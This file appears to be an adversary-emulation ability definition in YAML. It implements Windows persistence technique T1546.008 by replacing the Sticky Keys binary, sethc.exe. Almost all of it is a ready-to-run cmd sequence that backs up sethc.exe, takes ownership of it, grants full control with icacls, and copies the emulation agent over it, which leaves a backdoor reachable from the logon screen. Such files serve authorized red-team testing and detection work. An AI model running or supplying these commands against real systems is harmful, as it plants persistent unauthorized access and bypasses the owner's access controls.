id: f2963403-37a5-46e6-9cd5-f1c255012055
name: Replace binary of sticky keys
description: This procedure will replace the sticky keys binary (sethc.exe) with cmd.exe.
tactic: persistence
technique:
  id: T1546.008
  name: Accessibility Features
platforms:
  windows:
    cmd:
      command: |-
        copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
        takeown /F C:\Windows\System32\sethc.exe /A
        icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
        copy /Y #{agent.location} C:\Windows\System32\sethc.exe
metadata:
  authors:
    - bfuzzy1
  tags: []
  version: 1
  enabled: true
  latest:
    version: 1
